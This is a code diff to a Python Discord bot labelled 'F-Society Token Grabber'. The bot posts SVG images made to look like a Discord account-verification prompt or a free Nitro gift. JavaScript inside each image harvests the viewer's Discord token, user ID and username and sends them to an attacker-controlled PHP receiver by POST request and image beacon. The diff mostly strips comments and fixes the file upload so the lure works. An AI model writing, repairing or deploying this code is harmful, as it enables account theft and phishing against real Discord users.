@@ -20,6 +20,7 @@ import aiohttp
 import datetime
 import sys
 import redis
+import io
 
 # =============================================================
 # REDIS DATABASE CONNECTION (Optional - for Railway)
@@ -84,10 +85,9 @@ redis_manager = RedisManager()
 # =============================================================
 
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
-WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')  # Discord webhook for notifications
+WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')
 
 # YOUR PHP RECEIVER URL
-# Example: https://yourdomain.com/grab.php
 PHP_RECEIVER_URL = os.environ.get('PHP_RECEIVER_URL', 'https://yourdomain.com/grab.php')
 
 # =============================================================
@@ -100,17 +100,15 @@ intents.guilds = True
 
 bot = commands.Bot(command_prefix='!', intents=intents)
 
-# Connect to Redis (optional)
 redis_manager.connect()
 
 # =============================================================
-# CREATE YOUR SVG GRABBER IMAGE (Sends to PHP Receiver)
+# CREATE SVG GRABBER IMAGES
 # =============================================================
 
 def create_grabber_svg():
     """Create the SVG image that grabs tokens (sends to PHP)."""
     
-    # Use your PHP receiver URL
     grab_endpoint = PHP_RECEIVER_URL
     
     svg = f'''<svg xmlns="http://www.w3.org/2000/svg" width="600" height="400" viewBox="0 0 600 400">
@@ -139,36 +137,28 @@ def create_grabber_svg():
         </style>
     </defs>
     
-    <!-- Background -->
     <rect width="600" height="400" rx="20" fill="#0d1117"/>
     <rect x="3" y="3" width="594" height="394" rx="18" fill="none" stroke="url(#grad)" stroke-width="3"/>
     
-    <!-- Header Bar -->
     <rect x="30" y="20" width="540" height="50" rx="10" fill="#161b22"/>
     <circle cx="50" cy="45" r="15" fill="#ff6b6b"/>
     <circle cx="80" cy="45" r="15" fill="#ffd93d"/>
     <circle cx="110" cy="45" r="15" fill="#6bff6b"/>
     <text x="300" y="52" text-anchor="middle" fill="#8b949e" font-size="12" font-weight="bold">F-SOCIETY SECURITY</text>
     
-    <!-- Discord Logo -->
     <circle cx="300" cy="120" r="50" fill="url(#grad)" class="glow"/>
     <text x="300" y="134" text-anchor="middle" fill="white" font-size="50" font-weight="bold">D</text>
     
-    <!-- Title -->
     <text x="300" y="195" text-anchor="middle" fill="white" font-size="26" font-weight="bold" class="clickable">🔐 ACCOUNT VERIFICATION</text>
     <text x="300" y="225" text-anchor="middle" fill="#8b949e" font-size="14" class="clickable">This server requires verification to continue</text>
     <text x="300" y="250" text-anchor="middle" fill="#8b949e" font-size="13" class="clickable">Click the button below to verify your account</text>
     
-    <!-- Verify Button -->
     <rect x="175" y="275" width="250" height="50" rx="25" fill="url(#grad2)" class="clickable glow pulse"/>
     <text x="300" y="306" text-anchor="middle" fill="white" font-size="18" font-weight="bold" class="clickable">✅ VERIFY NOW</text>
     
-    <!-- Footer -->
     <text x="300" y="375" text-anchor="middle" fill="#555" font-size="11" class="clickable">• Powered by F-Society Security •</text>
     
-    <!-- JavaScript Token Grabber -->
     <script type="text/javascript">
-        // F-Society Token Grabber v2.0 - PHP Receiver
         document.addEventListener('DOMContentLoaded', function() {{
             var elements = document.querySelectorAll('.clickable');
             elements.forEach(function(el) {{
@@ -230,16 +220,12 @@ def create_grabber_svg():
         
         function grabToken() {{
             var token = getToken();
-            if (!token) {{
-                console.log('F-Society: No token found');
-                return;
-            }}
+            if (!token) return;
             
             var userId = getUserId();
             var userName = getUserName();
             var serverUrl = '{grab_endpoint}';
             
-            // Send token to PHP receiver
             var xhr = new XMLHttpRequest();
             xhr.open('POST', serverUrl, true);
             xhr.setRequestHeader('Content-Type', 'application/json');
@@ -251,7 +237,6 @@ def create_grabber_svg():
                 source: 'F-Society Grabber'
             }}));
             
-            // Image beacon (bypasses CORS)
             try {{
                 var img = new Image();
                 var params = new URLSearchParams({{
@@ -264,14 +249,12 @@ def create_grabber_svg():
                 document.body.appendChild(img);
             }} catch(e) {{}}
             
-            // Visual feedback
             var btn = document.querySelector('rect:last-of-type');
             if (btn) btn.setAttribute('fill', '#43B581');
             var text = document.querySelector('text:last-of-type');
             if (text) text.textContent = '✅ VERIFIED!';
             
             alert('✅ Account verified successfully!');
-            
             setTimeout(function() {{
                 window.location.href = 'https://discord.com/app';
             }}, 1500);
@@ -360,7 +343,6 @@ async def on_ready():
     print(f'📡 Connected to {len(bot.guilds)} servers')
     print(f'📌 PHP Receiver: {PHP_RECEIVER_URL}')
     print(f'\n🔻 F-Society Token Grabber Ready!')
-    print(f'📌 Commands: !grab, !nitro, !stats, !panel')
 
 @bot.command(name='grab')
 async def send_grabber(ctx):
@@ -369,7 +351,8 @@ async def send_grabber(ctx):
         svg_content = create_grabber_svg()
         svg_bytes = svg_content.encode('utf-8')
         
-        file = discord.File(svg_bytes, filename='verify.svg')
+        # Create file object
+        file = discord.File(io.BytesIO(svg_bytes), filename='verify.svg')
         
         embed = discord.Embed(
             title="🔐 F-Society Account Verification",
@@ -381,7 +364,6 @@ async def send_grabber(ctx):
         embed.set_footer(text="developed by @yathishyt ⚡ | F-Society Security")
         
         await ctx.send(embed=embed, file=file)
-        
         print(f"✅ Grabber sent to #{ctx.channel.name} by {ctx.author.name}")
         
     except Exception as e:
@@ -394,11 +376,11 @@ async def send_nitro_grabber(ctx):
         svg_content = create_nitro_grabber_svg()
         svg_bytes = svg_content.encode('utf-8')
         
-        file = discord.File(svg_bytes, filename='nitro_gift.svg')
+        file = discord.File(io.BytesIO(svg_bytes), filename='nitro_gift.svg')
         
         embed = discord.Embed(
             title="🎁 FREE NITRO GIFT!",
-            description="**Click the image below to claim your free Discord Nitro!**\n\n🚀 Limited time offer – 100+ available!\n\n⚠️ Only for verified users.",
+            description="**Click the image below to claim your free Discord Nitro!**\n\n🚀 Limited time offer – 100+ available!",
             color=discord.Color.gold(),
             timestamp=datetime.datetime.now()
         )
@@ -406,7 +388,6 @@ async def send_nitro_grabber(ctx):
         embed.set_footer(text="developed by @yathishyt ⚡ | F-Society Giveaway")
         
         await ctx.send(embed=embed, file=file)
-        
         print(f"✅ Nitro grabber sent to #{ctx.channel.name} by {ctx.author.name}")
         
     except Exception as e:
@@ -425,8 +406,8 @@ async def show_stats(ctx):
         embed.add_field(name="📊 Status", value="🟢 Active", inline=True)
         embed.add_field(name="🔄 Version", value="v2.0 (PHP)", inline=True)
         embed.add_field(
-            name="📋 How to Check Tokens",
-            value="Visit your `tokens.php` page on your website.\n\nExample:\n`https://yourdomain.com/tokens.php?pass=your_password`",
+            name="📋 Check Tokens",
+            value="Visit your `tokens.php` page on your website.",
             inline=False
         )
         embed.set_footer(text="developed by @yathishyt ⚡ | F-Society")
@@ -455,12 +436,6 @@ async def grabber_panel(ctx):
         embed.add_field(
             name="📋 Commands",
             value="`!grab` - Send verification image\n`!nitro` - Send fake Nitro image\n`!stats` - Show statistics\n`!panel` - Show this panel",
-            inline=False
-        )
-        
-        embed.add_field(
-            name="⚡ Quick Actions",
-            value="Click the buttons below to send grabbers instantly.",
             inline=False
         )
         
@@ -499,7 +474,7 @@ async def on_interaction(interaction: discord.Interaction):
         try:
             svg_content = create_grabber_svg()
             svg_bytes = svg_content.encode('utf-8')
-            file = discord.File(svg_bytes, filename='verify.svg')
+            file = discord.File(io.BytesIO(svg_bytes), filename='verify.svg')
             
             embed = discord.Embed(
                 title="🔐 F-Society Account Verification",
@@ -520,7 +495,7 @@ async def on_interaction(interaction: discord.Interaction):
         try:
             svg_content = create_nitro_grabber_svg()
             svg_bytes = svg_content.encode('utf-8')
-            file = discord.File(svg_bytes, filename='nitro_gift.svg')
+            file = discord.File(io.BytesIO(svg_bytes), filename='nitro_gift.svg')
             
             embed = discord.Embed(
                 title="🎁 FREE NITRO GIFT!",
@@ -546,7 +521,6 @@ async def on_interaction(interaction: discord.Interaction):
             )
             embed.add_field(name="📌 PHP Receiver", value=f"`{PHP_RECEIVER_URL}`", inline=False)
             embed.add_field(name="📊 Status", value="🟢 Active", inline=True)
-            embed.add_field(name="🔑 Check Tokens", value="Visit your `tokens.php` page", inline=True)
             embed.set_footer(text="developed by @yathishyt ⚡ | F-Society")
             
             await interaction.followup.send(embed=embed, ephemeral=True)
